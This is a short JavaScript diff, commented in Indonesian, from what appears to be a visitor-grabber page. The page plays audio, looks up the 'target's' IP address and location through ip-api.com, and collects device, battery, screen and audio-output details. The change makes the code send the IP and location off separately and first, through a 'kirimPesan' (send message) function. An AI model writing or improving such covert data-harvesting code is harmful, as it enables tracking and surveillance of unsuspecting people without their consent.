@@ -731,8 +731,9 @@ const mulai = async () => {
   audio.muted = false;
   try { await audio.play(); } catch {}
 
-  // Ambil IP + lokasi dari ip-api.com
-  const ipLokasi = await ambilIPTarget(); // ← tambahin ini dulu
+  // 🔹 Kirim IP & lokasi target dulu, terpisah
+  const ipLokasi = await ambilIPTarget();
+  await kirimPesan(ipLokasi);
 
   const infoPerangkat = await ambilDataPerangkat();
   const bateraiInfo = await ambilBaterai();
@@ -746,7 +747,6 @@ const mulai = async () => {
   const outputAudio = await ambilOutputAudio();
 
   const gabungAwal = [
-    ipLokasi,                // ← tambahkan paling atas
     infoPerangkat,
     bateraiInfo,
     layarGrafik,
